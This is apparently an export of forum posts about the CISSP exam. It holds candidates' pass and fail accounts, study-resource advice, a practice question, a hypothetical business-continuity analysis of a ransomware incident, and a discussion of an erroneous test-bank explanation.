As for studying, I went through a free CISSP boot camp thing that Syracuse University provides for veterans called Onward 2 Opportunity, which isn't much different than any of the 20 hour CISSP training courses on Udemy but it includes all of the official training and practice exam books (barely touched the extra resources) and an excessively in-the-weeds practice exam system through Percipio that helped with learning way too detailed information about things that didn't matter. I also read part of the 11th Hour study guide and went through some of the CISSP Practice Exam book by Shon Harris, like maybe a third of it. I was getting around 80% on practice exams before sitting the exam.
I also watched that ""Why you will pass the CISSP"" video everyone recommends before leaving for the exam today, and it definitely helped getting in the right mindset for the test.

All in all, I don't think it's actually as difficult as some people make it out to be, if you have at least some related experience and actually do some studying.",2021-08-13
2750,p8he4a,Passed in 100 @ 100,"Took my exam today at 1PM and got a provisional pass!

I feel like I did a solid amount of preparation and I also work in the security assessment space so wanted to take a stab at it without much study time. I started July 17th and gave myself a month. I wasn't sure on how confident I would feel in that time frame so I actually didn't register until August 10th. At that point I felt pretty confident in being able to tackle the exam, but from 8/10-8/19 I was eat/sleep/breath CISSP (wife wasn't a fan lol). The exam was definitely interesting. My last certification was Security+ and AWS:CCP which both are super straight forward. I did not feel that way about the CISSP. My confidence level was high on only about 50% of the questions.  

I used the following material for prep: Books: 11th hour (read entire thing in last 48 hours), OSG 8th edition (probably spent less than an hour in this book over my course of studies), Luke Ahmeds 25 question book  Questions: Official Practice Tests 3rd edition (answered \~200 questions from here); Wiley Practice Tests (\~1000 questions); Pocket Prep (all 800, app is at 96% correct), Discord questions (a lot); ISC2 app (\~500 questions)  Videos: Kelly H. - Cybrary CISSP; Mike Chapple - LinkedinLearning; Destination Certification; CISSP Exam CRAM series; Prabh Nair, Luke Ahmed, etc.; every think like a manager video I could find :) The video content was probably 100% the reason I passed  Filled a 70 page notebook with things I was writing down from videos and books; probably wrote out BCP and SDLC process 10x each

I spent $0 on additional resources. I did get the ISC2 Official Practice Test book from a coworker who has his cert. My primary resource was I watched the [""CISSP Exam Cram"" videos on YouTube](https://www.youtube.com/playlist?list=PL7XJSuT7Dq_XPK_qmYMqfiBjbtHJRWigD) but I only actually watched the videos for the first 6 domains and didn't watch any of those extra ones.

At the end of the day, I either just got really lucky or experience actually does go a long way in preparing you for this exam (probably a little of both).

1) The Official Study guide:  I read it cover to cover before using any other materials. Dry reading but it was a goal to get through it. 
2) Mindmap videos: These were an excellent resource.

Took and passed the CISSP this morning on my first attempt. If I can pass it on my first attempt, then any of you can. It took me around 100 minutes and 101 questions.

Like many have posted here before, the exam provided many challenging questions, and it felt like I was in the ring with Mike Tyson for 12 rounds. When the screen went blank after Q101 I was pretty nervous that I failed, because I did not feel that I was doing THAT well. However, I passed. Below is a little about me and how I prepared.

Of Note: It is key to remember that there are ""Developmental Questions"" embedded. Seeing those provided some challenges, but if you see some questions out of the ordinary or seem like content you did not see in your studies, do not worry. Additionally, I took the approach of the CAT is here to help. It is here to keep you from failing by providing questions to keep you at/near a passing score.

2758,owdfw6,Fun CISSP Practice Question,"\*\*Admin(s) Please Delete If Not Helpful\*\*

By the end of 1989, the price of ROM chips was dropping enough that Capcom game designers Akira Nishitani and Akira Yasuda began their ambitious plan for Street Fighter 2. Senior management asked the two designers to stay in-line with the original game and keep it straight forward. Management also asked for a quick turnaround to compete with other upcoming game releases such as Midway’s Mortal Kombat.

While the designers wanted to stay within the confines of the original game structure, they also wanted the freedom to try new things during development with the new ROM chips. Their goal was to create a list of skilled and iconic characters each with their own special abilities. For example, the additional memory space allowed the character Guile to have his Low Kick flipped to look like an upside-down air kick. And as Dhalsim’s limbs started getting longer and longer with each development iteration, it could be counter-balanced by making the character move slower. E. Honda’s flying attack and Chun Li’s Spinning Bird Kick were also newly added memory spaces on the ROM boards. These moves pushed the game from realistic to unrealistic, and added to its charm.

48-bits of data were allocated on the game boards to accommodate these changes.

This resulted in characters slowly increasing their assigned memory while in production and sometimes required a quick fix. In order to make these constant changes, Nishitani and Yasuda needed an accelerated development process with the final end-result already defined, but with the flexibility to allow for improvements while prototyping designs, going back and cutting animation frames for memory conservation, and re-examining system motherboard architecture. The designers needed the ability to constantly build, demonstrate, and refine their game animation changes.

Which of the following software development models would best fit this environment?

A. Waterfall method  
B. Rapid Application Development  
C. Joint Application Development  
D. Spiral Model

2759,ou4xez,"Failed, 150 questions","So today I took my first CISSP exam and failed. I guess I am wondering is it possible to determine if I was close to passing or not? I was above proficiency on two domains, near proficiency on five domains and below proficiency on one domain. Now I understand that near proficiency isn’t enough but does near mean that I was a question or two off from being above? Ive read that if you are below on lower weighted domains it is possible that if you are above on higher weighted domains you can make up for it? 

How near to passing is ‘near proficiency’ 

I just wish they gave me a little more breakdown of how close I was exactly. I have been studying for the past 6 weeks( min. 4 hours a day) one week was a boot camp. I have 8 years security experience and 7 years system administration experience and thought I was doing everything right leading up to the exam. But after leaving the exam, I don’t know what to go back and review for my second attempt. Most of the questions were opinion based “choose BEST” answers which all of them were correct just had to choose the “more” correct answer. The domain I was below proficiency on , during my practice questions I was above 80% on, so I am just really discouraged and would appreciate any tips on how I should move forward.",2021-07-29

2761,o9xi77,Passed today @100q,"So, I passed the exam today after finishing 100 questions. I will admit I was shocked but of course overjoyed.

I want to thank everyone here for sharing their experiences and insights as it relates to preparation and more.

I took the exam back in 2016 and failed.. I had taken a boot camp and thought I was ready, but I wasn’t and I didn’t have the right mindset going in. Of course I took the test in the old format so I mentally prepared myself for the new style this go round.

In terms of study….
-I read CISSP for dummies back in September and started flagging areas I needed to do further research on to understand. I identified a study plan and then I tried to stick to that. I wasn’t as strict as I could’ve been during the holidays and beginning of the year, so I had to really buckle down the last month and a half/two months before the exam.

-sunflower: it was okay I mean I read a few times but it just wasn’t for me. Maybe the way the information was setup just couldn’t work for my thought process. But still good to glance at.

-Sybex book: I tried to read cover to cover but it was hard to get through after a while I started using it as reference for things I couldn’t grasp. I did do the practice questions too.

-BOSON: you can’t skip this. While the questions are overly technical they help reinforce and identify what you are weak on. Do each test once and that’s it. If you keep doing them repeatedly you won’t learn anything. Just use them to get a sense of where you are and make adjustments to your study plan accordingly.

-Thor’s courses on Udemy I listed to the audio of the videos to and from work for the last 6 weeks. I took the practice tests at the end of each chapter and at the end of each course.

-CISSP ALL IN ONE  by SHON HARRIS.. I loved this book. Absolutely loved this book because I felt it was easier to read just overall easier to digest. I did practice questions at the ends of each chapter and also read the bullet lists of quick tips at the end to refresh myself the day before the exam. 

-Thor’s hard questions. I purchased them as soon as they were released and took all four. Understand that these are really hard and you will likely score lower here than you have on other practice questions. I will admit I scored horribly but realized there were a few things I was getting confused on and that I really need to take time and review some areas I assumed I just knew because they were directly related to my day to day job. I reviewed them and even found diagrams online to help me better understand. I’m more of a visual person so after a while the text is just gibberish to me. Pictures help a hell of a lot.

-this leads me to cheat sheets. I found Comparitech’s sheets online and found them easier than sunflower to digest. Granted printing some of the domains did the cheat sheets no justice because it was too small to read. I have a large tv screen to view things so for me it was better to read digitally. 

-Kelly Handerhan’s Why You Will Pass the CISSP 10 minute video. I read it before I began my study plan and again this morning before the test. Let me tell you, she reinforces the mindset and encourages you to find that confidence from within to really tackle this exam and come out a winner.

The main thing I would say is find a way that works for you. Books, pictures, video, audio.. whatever. At the end of the day you can do it.. you can pass! Just give yourself time.",2021-06-29
2762,p24uqd,Passed at 100 questions today,"I think the things that helped me the most

1. Consistent study plan over several months. One hour per day during work week.
2. Boson practice exams. Worth the 90 bucks. Definitely the most similar practice questions to the exam.
3. Larry greenblatt on YouTube. He is a little hippy dippy but give him atleast 40 minutes of your time before you move on. His mindset helps you choose the best answer when you narrow it down to two or three answers.
4. Luke ahmed “think like a manager” book. This helps you understand that you should always prioritize policies, thinking before you act, and risk management. Again, helps pick the best answer.
5. Read the questions twice, atleast! I passed at 100 questions at exactly two hours. There were two questions where i was like “ok no clue move on”. But for the others, especially the ones that seems way too easy, read it again! There are almost always two answers that are right. Ask yourself - which is more specific? Is one answer too generic that now the scope is huge and you would waste money? 
6. Wear contacts. My glasses fogged so bad and it was distracting because of covid.
7. Be prepared for some noise distractions and don’t let it ruin your exam. The person next to me cleared their throat every 30 seconds and I was so angry. I broke the marker. Took a deep breath. And told myself to never give up. And then I went back to it.
8. This is a technical exam! You should know how the technologies work. Study what you don’t know and do a deep dive. Worst case scenario you understand a security topic like PKI really well and you use it in your job 3 years from now.

I’m glad I passed. I honestly don’t know if I would have had the strength to keep studying and retake. For those of you that keep failing and keep trying - you are strong. Keep pursuing what is meaningful to you and don’t let anything ruin your relationships and whatever else is important to you.",2021-08-11

2765,ovm35i,Failed today at 150 questions,"Welp...i kinda saw that coming. I felt very unprepared the 2 weeks before the exam. The more i crammed, the less i felt like i knew. Practice tests range from 50-68%, which was discouraging. 

I have a bachelor's in business management (2011) and a masters in information technology systems (2020). I work as a research analyst for a small tech company. My everyday job isn't technical or managerial, but i have done some light technical work here and there for the company the past 9 years I've been there. I thought the test was pretty technical. Especially domain 4, my greatest nemesis. 

Started studying beginning of May. I tried to read the shon harris book, but was overwhelmed (only got through 1/2 book) At the end of may, i took a few practice tests and got around 50%. Only studied about 3hrs on a good day, much less or none on busy days. 

June, used the 11th hour to get to know the domains and then go into detail with videos, research, and shon harris book. Started doing practice test questions every other day. Was feeling better in June.... Then life happened. Didn't study for ~3 weeks. I kept thinking i had time left to study in july. 

July comes and things don't cool downwith life stuff. I was thinking of rescheduling but my mom convinced me to keep my date. It will force me to study, which i agreed with. Didn't get any better. Was only able to study everyday for ~3hr. 

Took a week off work before the exam to cram. That was the bulk of my study time, but even on the week of, i studied 5-6hr. 

I think the practice tests i used were representative of the exam. The sybex practice questions were pretty good, especially in how it is worded. The questions were similar, but the answer choices in the actual exam were more tricky.
They were not as obvious as the practice tests. I was able to narrow questions down to 2 answers. I took too much time in the beginning 50q and didn't have enough time for the rest of the test. Ended up rushing the last bit. 

Knew i failed when the last few questions were straight forward and much easier. Got a lot of legal and regulatory questions that i didn't know because glossed over those in my studies.

Study materials: 
Shon harris all in one CISSP (mostly used to do practice tests. Did ~700q)

11th hour

Sybex 3rd edition practice tests (did ~200 questions. Bought too late in July) 

Destination mind map videos (watched each vid 2x + took notes) 

Cissp cram series (watched each video 2x + followed slides)

Day before exam listed to how to think like a manager by Luke Ahmed and eric conrad's cissp cram session 

My plan for the 2nd time (hopefully last): 
Boot camp. I'm really bad with self study and need some structure. Plus, can tell people in my life i have to go to school for a chunk of time

More practice questions. Want to do all the questions i have

Look for an audio book version of a prep book 

Study things in detail. Deeper understanding of the WHY!

2766,ol29bu,Provisional Pass,"Hey ladies and gents,

I took the test yesterday just out of whim. I'm a network administrator with 8 years experience. I honestly think that Security+ was harder than the CISSP exam and I think that could be attributed to the large body of knowledge and question pool that usually comes with CompTIA exams. I'm at the tail end of a Cybersecurity degree so maybe that helped out but I just went in to the test with a ""ain't nothing to it but to do it"" attitude. The body of knowledge illustrated by ISC2 is crucial to planning out how you need to study if you have prior knowledge of the field. I think my networking experience helped out too. The toughest part for us technical folks I believe would be moving away from our traditional thought process when it comes to solving problems. There are going to be multiple choices that feel like the right answer but it's all about management mentality that'll help find the ""most"" right answer.

2769,oa36sd,Provisionally passed 29th June 2021,"I had provisionally passed the CISSP exam this morning. It ended at 100 questions around 135 mins mark. 

I scheduled the exam date in April just before the price hike, and I almost exclusively only used Luke Ahmed's Study Notes and Theory practice tests to prepare during the past 2 months.

I had practiced with questions A until 1A one time each, and only used 1 set of practice exam from Boson to check if I was able to complete 150 questions within 3 hours. Overall I think I had reviewed around 1000 questions.

My average score varies between 60+ to 70+, but after taking Luke's hard questions, the real exam questions feel simpler, but not easy by any means.

Though I didn't read any prep books besides reviewing the practice tests, I do have 10+ years of experience in the field which I relied upon heavily. Using similar strategy, I had passed CISM exam in March this year after 2 weeks practising the QAE.

On the last day before the exam, I had also watched some of the Destination Certification CISSP videos on Youtube and I found them to be very helpful in solidifying the concepts. I wish I had watched all of them earlier!

I didn't follow any strict study plans, just practiced the questions whenever I can; on the bus, after work while listening to the news, while tending to the baby crying, while accompanying my wife watching Netflix, and even during toilet time lol! I'm fortunate that my wife is very understanding to tolerate my 3AM sleep schedules.

I had seriously considered to reschedule the exam date to have more time to prepare, but I'm really glad that I believe in myself and go ahead anyways. Extremely relieved that it's over now!

Before I get into the journey, I will tell you about my background. I have been in the IT industry for 15 years wearing many hats along the way. I was a managed services network engineer for most of it, although I also worked on systems and security in these roles. I was also an ISO/IT Manager for about four years in the financial industry. I am currently working as a network engineer in the media and broadcast industry. I currently hold CCNP r/S, MCSA/MCSE 2016, A+, Network+ and CISM.

&#x200B;

I have been studying for the CISSP off and on for the last two years. I was hoping to test in early 2020, but the testing centers closed for a while due to COVID. I studied the official study guide (read it cover to cover) and finished the 11th hour by Eric Conrad. This took about two weeks. I tried to read the Shon Harris edition, but I wasn't captivated by the writing style. It felt like reading a dictionary. The official guide was still a hard read, but I was able to keep up with the progression. I also used several practice tests including: the official practice tests, Boson, Shon Harris practice questions and PocketPrep. I would test myself on random questions and when I did poorly, I would review chapter material or concepts.

&#x200B;

After I learned that ISACA allowed online testing, I scheduled my CISM test for May of 2020. Unfortunately, I had technical issues logging into the exam environment so I was not able to take the test. Support did issue me a voucher to retake the exam, but I did not end up taking the exam until April 2021. Not wanting my voucher to expire, I studied the All-In-One study book for the CISM and used the QAE question bank to help (re)prepare. I thought both were essential for passing the CISM exam. I was able to pass the CISM when I took it in April 2021; thankfully I had no technical issues this time. The proctor had me scan the room, under the desk, etc. to ensure a secure test environment at home. It took about two weeks to have my work experience approved, maintenance fees, etc. until I was finally CISM certified.

&#x200B;

I told my employer about my new credentials and my interest in cybersecurity management. They requested I take the CISSP as it was viewed as a harder tested (I'll comment on that later). I ordered the ninth edition of the Official study guide and started my studies with a focused approach on my weak domains. I continued to use my practice tests to focus on these areas. I used PocketPrep and Boson for most of it. When I started using Boson, I was averaging 60-70%. After two months of studying, I was able to bring that up to 80-90% on average. I bought the CCCure questions, but only used them a few times. I heard on this forum that Boson was the best and I agree with that. I finally decided to schedule a date and get it done. I picked 7/29 as my test date and I was a nervous wreck leading up to the exam date. I felt I understudied, unprepared, etc. even though I have been studying hard for the last several months. I read the 11th hour book cover to cover to brush up on my topics. I read this until the late morning on the day of my test. My test was at 2 PM. I also watched the Kelly (Why you will pass the CISSP) video and Larry's videos and they will essential for gaining the right mindset. DON'T FIX ANYTHING!!! Cost benefit analysis for each solution. Management answers are always applicable. Focus on human life.

&#x200B;

I did a few Boson practice questions in the parking to get into the mindset of reading the questions slowly (once, twice), reading the answers slowly (once, twice). All the time to think like a manager, not an engineer. My heart rate was up and I was stressing out. I finally made my way into the testing center for the moment of truth. After the palm scans, NDA and all the processing, I finally started the exam. What I read on this forum was accurate. These were like no questions I have ever seen in my practice test bank. I had a handful that were like that, but most were scenario based. You have to completely understand the concepts and when to use them. I would read the question two or three times, figure out what they were asking and then select the appropriate or best answer. I also proved the other answers were incorrect or less accurate than the answer I chose. Several questions were way out of left field and I used an educated guess to eliminate the wrong answers. After going past 100 questions, I really thought I was headed for failure. I was thinking, all that studying and it is still not enough. I even visualized my next steps, like attending a boot camp. Nevertheless, I continued to answer each question as if it would make or break my passing grade. I finally got to question 150 with about an hour left and clicked finish exam. I was surprised it didn't have a survey like the other exams I have taken.

&#x200B;

I had to go through the checkout process (ID and palm scans again). The proctor verified my name on the printout and I noticed when she was holding it, it did not have bar graphs like I heard similar to a failure report. When she handed it to me, I saw ""Congratulations"" and said aloud, ""Well I wasn't expecting that."" haha I'm so glad I stuck with it and continued to fight for the win. I feel the networking questions pushed me over the top since that is my strongest area. I know I didn't ace it at 100 questions, but I tried my best and that is all that mattered to me. I look forward to the future this certification will bring. If anyone has tips on staying on top of the CE's, I would greatly appreciate it.

&#x200B;

I feel the CISM will help prepare you for the CISSP, but while they are similar, they are also very different. The CISM is more management focused without the high level technical knowledge required for the CISSP. Both exams were very challenging. CISM is paramount if you plan to pursue a Infosec Manager role and analyzing/reporting risk to C-level executives. There is a lot of overlap between the two, but studying for one doesn't necessarily prepare you for the other without additional study.

&#x200B;

Whatever your journey may be, I wish you all the best and I'm happy to answer any questions that do no break the NDA.

2774,opked7,CISSP Experience,"This forum helped me quite a bit and hence thought to update my experience for the benefit of the community and offer credit to the immense learning resources on the web

About me: Over 10 years in IT / Risk / Cyber.  

**Prep:** About 3 months, initially about 1 hour / day followed by 3-5 hours of revision in the last 2 weeks.

The following resources help strengthen my concepts (A big thanks to all of them):

· Thor Teaches

· Kelly videos

· Official study guide and practice questions

· CISSP mind maps on YouTube ([https://www.youtube.com/watch?v=6X4A6B94vmw&t=101s](https://www.youtube.com/watch?v=6X4A6B94vmw&t=101s))

· Reddit and ISC forum

· Reviewed the ISC practice questions once but did not attempt any more practice exams since I ran out of time. 

**Exam experience:**

Like most of the commentators before me mentioned, the questions were not straight forward, and I had no clue if the answer was correct. In fact, I tried looking up the answers to some of the questions I recalled at home but struggled even with Google! Some domains had more questions than others. I planned to take a break after 100 questions, but the exam ended on the 100th question with 1hour to spare. I did not look at my transcript until I was out of the centre  and was pleased to have provisionally passed. 

**Top Tips:**

Read the question and identity key words such as “Which solution”, “What comes first” etc. This should help filter out some of the answers. 

There is a lot of material out there and found additional value in each of them. Since the scope of CISSP is huge you will need to refer multiple sources.

If I had to prepare again, I would try to cover as many topics as possible and answer the following question with 1-line answers. What, Why and How. I don’t think it is necessary to go in depth and unnecessary details. Focus on concepts and understand why some of the technologies actually exist, their vulnerabilities and remediation. Use practice tests to re-in force these concepts and not as a barometer of your performance in the exam.   

Hope this helps :)",2021-07-22
2775,of9geh,Fujifilm Ransomware BCP/DRP CISSP Correlation,"Greetings, I wish everyone good luck on their CISSP exam this week.  With all the ransomware news, I was especially impressed with the way Fujifilm handled their ransomware incident.  They didn't pay the ransom and recovered operations from backup.  Just thought I'd share some notes of what I thought Fujifilm's BCP/DRP process may have looked like if it helps to correlate the real-life event to your CISSP studies.  Everything below is hypothetical and just used as an example to apply CISSP concepts to real life.  These are just guesses.  

BCP/DRP Process (General) Steps

  **Step 1** **is defining a policy, narrowing down the scope, and beginning the initiation of the BCP/DRP**

*  For Fujifilm, their senior management probably did have a clear policy and scope defined.  
* We can tell they had a policy and scope because when the article I was reading on the publication “Verdict”, asked the company if they had sufficient backups, their response was “Fujifilm does have **backups** in place as a part of its **normal operations procedure** aligned with its **policy**”.
* If Fujifilm had a policy about normal operations procedures after a disaster, it means they definitely had a policy to have a BCP/DRP plan in the first place, because as we know, nothing gets done in a company without first having a policy from senior management.
* Because Fujifilm had a policy to have a BCP/DRP plan in the first place, it attributed to their successful recovery of operations. 
* Otherwise, if there was no policy or a BCP/DRP plan, things would not have gone as smoothly.
* During the ransomware attack nobody would know what to do, what direction to go, how to handle the situation…nothing.  It takes a policy from management to create the BCP/DRP plan, which will provide the pathway to how to handle a disaster.  

  **Step 2 Business Impact Analysis - Define the critical business functions and resources**

* Fujifilm's Chief of Operations could state that if the data on those servers were being held for ransom, the business would come to a standstill, and the data would be needed back in order to continue operations. 
* The Director of Network Operations could say that if their Content Delivery Network solution were to stop working, that would stop the organization’s e-commerce business process, and would result in a heavy loss of revenue.  
* Both provided a technical issue, but also stated how it would affect the overall revenue-generating process of the company (both technical and high-level reasons)

  **Step 3** **- Contingency Strategies (Decide the most cost-effective and reasonable recovery strategy)**

* According to FIPS 199 an impact level of ""High"" would mean any damage or disruption to assets with this rating could halt everything in the business, the organization, the objectives, the networks, systems, applications
* Suggested backup is real-time replication of data as well as WAN/VLAN replication
* Suggested recovery strategy is a hot site

  **Step 4 - Testing and Maintenance** 

* Out of all the tests, maybe they most likely did a parallel test
* Businesses are hesitant about a full-interruption test as it means to stop the business
* If it was a structured walkthrough then individuals who head their own respective departments come together and discuss responsibilities
* If they did a simulation test, they would have all their BCP coordinators, BCP team, network engineers or their bosses, or other operational and mid-level management there to participate.  
   * Meaning, it’s just a simulation, but you have to act like it's happening.  Fujifilm probably checked to make sure their backups were processing, and ran through some things to see if the backups could be retrieved, without actually fully recovering them.  
   * They just simulated not only the disaster, but also the response, nothing “actually” was done like in a parallel test.  
* And of course, as with all CISSP processes, make sure there is documentation  
* Also updating the BCP/DRP document in case of any of these changes: 
   * Major changes to the company’s network or system architecture 
   * Changes to senior management
   * The addition or removal of certain technology
* Documentation and updating changes to the BCP/DRP document is all part of ""maintenance""

I thought it was neat how Fujifilm didn't pay the ransom and initiated a successful BCP/DRP.

2789,otq9aj,About a question from the Wiley CISSP test bank...,"Greetings everyone. I attempted the Bonus Exam from Wiley's Test Bank today, and one of the questions asked about a packet analysis scenario.

The questions goes like this:

>While performing network packet capture analysis, you discover packets that seem odd. By looking into the packet’s raw hex display, you see that the byte offset position 0x2F has the value of 0x08. What was this packet attempting to make occur?  
>  
>A. Abruptly disconnect a session  
>  
>B. Confirm the receipt of a data set  
>  
>C. Start a graceful hang-up process  
>  
>D. Initiate a new session connection

I pick A, the answer that this shows a reset, to abruptly end the connection, and Wiley says I'm right. It provides the following explanation which I'll copy and paste here:

>The raw hex value of 0x08 in offset position 0x2F represents the binary number of 00000100. When this binary number is compared to the TCP header flag (i.e., the offset position 0x2F) layout of XXUAPRSF, it is clear the Reset flag is set. Thus, this packet is attempting to abruptly disconnect a session.

This seems strange, because 0x08 is binary 00001000, so the explanation is one position off.

The layout of the control bits is correct, XXUAPRSF, and RST is indeed 00000100. But, that means the hex value should be 0x04 in both the question *and* the answer / explanation.

Furthermore, the offset position for the TCP header flag should be byte offset 13, i.e. TCP\[13\]. Why does it say offset position 0x2F?

It seems as if Wiley made several mistakes here. Either that, or I am losing my mind. Can you guys weigh in?

One last point is that I hardly think questions like this will appear in the actual exam. Packet analysis seems too far down in the weeds. What do you guys think?",2021-07-29

I have experience in most of the domains except SDLC, so my study needs were to validate what I thought I knew and then to fill in gaps where I didn't have as much experience.  It turned out I had more gaps than expected in domains I thought I was strong in (eg. crypto), and fewer in the gaps where I thought I was weak (eg. SDLC).  I also have a lot of multiple choice test experience from other exams like the LSAT, and this definitely helped.

**My approach**

\- I did practice questions with the Pocket Prep app (now called IT & Security) to assess where I stood on the domains.

\- Then I zeroed in on my weak domains and topics I kept missing in practice.  I used ""70 Tips and Tricks for Mastering the CISSP Exam"" by R. Sarma Danturhi to get a good, concise overview of specific topics.

\- After reaching saturation on Pocket Prep I started doing the Boson practice exams.  I made careful notes from the Pocket Prep and Boson explanations of questions I missed, and made flashcards with a free app called Rolandos to drill on recurring gaps.

\- I prioritized rote memorization of only a handful of core concepts that practice exams showed I was likely to need.

**General advice**

\- **Plan and visualize your visit the day** before to minimize the mental load that will be on you that day.  Look up the exam site in google maps.  Check exterior and interior photos if there are any.  Figure out parking or transport and book in advance if you can.  Plan what you'll wear into the exam room which may be warm or cool (likely to be warm given the PCs used for the exams).  Gather your IDs (you likely need at least 2) and any needed supplies (water, protein bars, etc.) in a bag that can fit in a small storage locker.  Check Covid mask requirements.  

\- Prepare yourself mentally to do 150 questions and to push onward without hesitation or self-pity if you go past 100.  A pass is a pass.

\- To paraphrase Bruce Lee, avoid practicing while overly tired.  If I was too tired, my practice scores dipped, drove down my average, and demotivated me.  When this happened, I put everything away and came back the next day, but I also made sure this didn't become an easy excuse.

\- Don't cram.  The day before my exam, I stopped studying mid-day and binged Netflix with a bag of chips in the evening.  The morning of, I was tempted to do some last minute review but stopped.  I told myself 20-30 minutes of review wasn't going to make a difference and it didn't.

\- If you have to wear a mask, take time to find one you'll be comfortable in for 1-3 hours.

\- Be ready for some bad grammar on some questions and answers that impacts their meaning; you just have to deal with it as best you can.

\- Review at least one current study resource published within the last year to prevent you from being blindsided by a new cutting edge topic or technology.  I found Mike Chapple's LinkedIn videos good for this.

**What was useful**

\- The Pocket Prep app was my main weapon of choice.  It was on my phone so I could do a quick quiz whenever I had a few minutes of downtime.  I think this was critical to getting lots of reps in.  

\- The Boson practice exams were quite good because they were challenging and very different than the Pocket Prep questions.  It was a good way to double check I was where I thought I was on the domains, and it spotlighted some new topics I hadn't encountered before.  Check this subreddit for a current discount code before you buy.

\- Danturthi's book was good for concise summaries of key topics in each domain.  He also emphasizes reading questions carefully and refactoring them in your head to remove irrelevant language, which I thought was a sound approach.

\- I found Chapple's LinkedIn videos to be up to date, well presented, and detailed.  They were also indexed to make skipping to a specific subject easy.  However, I don't learn efficiently from videos so I mostly used these to zero in on specific topics.

\- Kelly Handerhan's ""Why You Will Pass"" is a free, short, and worthwhile YouTube watch, even if just to reinforce that you should think like a manager.  I am one, so this wasn't a stretch, but it is a critical mindset to bring into the exam.

\- There are some cheat sheet style summaries which are posted in this subreddit which I found to be helpful.

**What wasn't useful**

\- I did not find the official ISC2 study app to be useful.  It didn't offer different study modes or statistics, and I think the question banks in Pocket Prep and Boson are superior for learning the domains holistically.

\- I found Kelly Handerhan's Cybrary videos to be a bit too high level for me, but I think they would be a good entry point for someone new to the field.  Her videos are very down to earth and accessible.

\- I felt that the explanations in Pocket Prep and Boson adequately covered the Shon Harris and Chapple books, so I did not feel it necessary to buy them having drilled these apps.

I hope this is helpful! Good luck!",2021-08-24

2810,p97b2a,provisionally passed HCISPP and passed all 9 ISC2 exam,"I have provisionally passed the HCISPP -  my 9th certification exam in ISC2.

Though this post is not about passing CISSP, but I attended my CISSP certifcation in 2018, continuously improve and learn. Being certified in CISSP isn't an end but a begin of your new journey. 

It opens you a doorway and demonstrate you have sufficient knowledge in various security domains (now 10?) and where  you can then focus on what you are lacking or you are interested further.

In between the years after certified in CISSP, I have also certified in ISACA's 5 CXXX exams. 

Excited to submit my final endsorment for ISC2 to review. 

And should I say ""graduate"" from ISC2?

For those who  are not yet ready for CISSP (CISSP is not a beginner certificate), it's ok,  you can try SSCP instead as a starting point, I would strongly recommended this (though it's not the path I have taken). But SSCP is a good interim step for you to prepare your CISSP if you don't have the full domain knowledge and experience.

2814,p8kknx,Passed at 150 8/18/21! Huge Thank You To this Sub and Few Lessons Learned,"I have been waiting to write this post for a long time. I'll try to keep it succint and useful.

Background: Retired Military with last 12 years in upper middle IT/Policy management.  Took a training camp CISSP boot camp one time a few years back before retiring. Didn't pass, it was the old 250 Q format and I scored a 600. Seeing as this course is now $5K I would not even consider it.

I knew it was passable so I set a goal to get it done. I didn't look to seriously complete that goal until around 3 months ago. Long before that I hung around this sub reading about people's successes and failures. I started in June, studied a few hours a day, with 80% of my study time devoted to the various question bank apps. I did these while on the stationary bike at the gym.

I probably bought EVERY resource on here and TRIED to get through all of them. Here's the rub...I DIDN'T NEED THEM ALL!!!  

This is where lessons learned come in, so here goes. 

1. Run your own race. Take a few practice tests and get a gauge on what you know. If you are scoring in the 50-60% rate at the start, you have a solid baseline to build on.
2. Once you get that baseline, SCHEDULE THE TEST. It is said so much here, but is the single biggest driver that will make you study.
3. THINK LIKE A MANAGER...but KNOW THE MATERIAL LIKE A TECHNICIAN. Just thinking like a manager will not get you through this test. There will be plenty of purely technical questions too.
4. The BEST study material/formats are the you ACTUALLY CONSISTENTLY DO. Don't waste money on stuff you aren't going to use. I have the shon harris book, sybex 8/9, the CBK...I got through about 30% of the content across all of these. The material bored me to tears. What I was able to consistently digest was practice questions with some delving to the books for problem areas. That said, know you will need to use SEVERAL sources...this is good for building your knowledge base, and getting used to different terms for the same thing. 
5. Don't take your practice test scores in relation to others here as some type of gospel as to whether you should test. Use them to gauge your knowledge. My highest score on Boson was 610, and my usual score was around 550. I only consistently scored in the 60s-70s on the Shon Harris online questions. Pocket prep was in the 70s too, only went up with repeat questions.
6. Do a PLEHORA of question across NUMEROUS sources. Not only does this build your knowledge base, it also builds your stamina for when you take the test. ALSO MEMORIZE the answers...people say don't that, but guess what, you are probably bound to get a few softball questions that you only get right because you memorized some obscure aspect of an answer. Learn why the answers are wrong but YES some rote memorization is required. You don't want to get a gimme vocabulary question wrong because you didn't do some basic memorizing.
7. Everyone's experience with the test is different! The test was definitely hard, but at no time did I feel like I was taking a different test that what I studied. It just fest like they worded the stuff differently. Pretty much 80% of my questions felt *vaguely familiar*.
8. Find a video bootcamp series or two and VIEW THEM IN THEIR ENTIRETY. I tried all of them and everyone learns different so you have to find the one that works for you. The right answer is the one you can get through, lol. I will just put my experience with these.                                                                         

*  Kelly Handerhan Cybrary, Rob Witcher(MindMap) --These people are doing the lord's work. I owe them largely for my pass
* Thor Pederson, I could not get through his udemy courses...hated his tests too...hhhmmm.
* Phrabh Nair -- couldn't get through his course
* Mike Chapple -- Nope couldn't get though his either
* Larry Greenblatt -- Maybe his live boot camp is better but the $99 package SUCKS! Dude is not funny! 80% nonsensical rambling, off topic banter and defensive driving class comedian level  humor, 20% actual usable insight into the test.
* That said I did at least 10% of every source I listed so take it for what that's worth.

This got real long real fast I guess the best advise is find the study materials that work for you, get a baseline and set a timeline to test, then STICK TO IT.

When you get weary, come here for motivation. That's it and THANK YOU!!!!!!!!!!",2021-08-21
2815,p8he4a,Passed in 100 @ 100,"Took my exam today at 1PM and got a provisional pass!

I feel like I did a solid amount of preparation and I also work in the security assessment space so wanted to take a stab at it without much study time. I started July 17th and gave myself a month. I wasn't sure on how confident I would feel in that time frame so I actually didn't register until August 10th. At that point I felt pretty confident in being able to tackle the exam, but from 8/10-8/19 I was eat/sleep/breath CISSP (wife wasn't a fan lol). The exam was definitely interesting. My last certification was Security+ and AWS:CCP which both are super straight forward. I did not feel that way about the CISSP. My confidence level was high on only about 50% of the questions.  

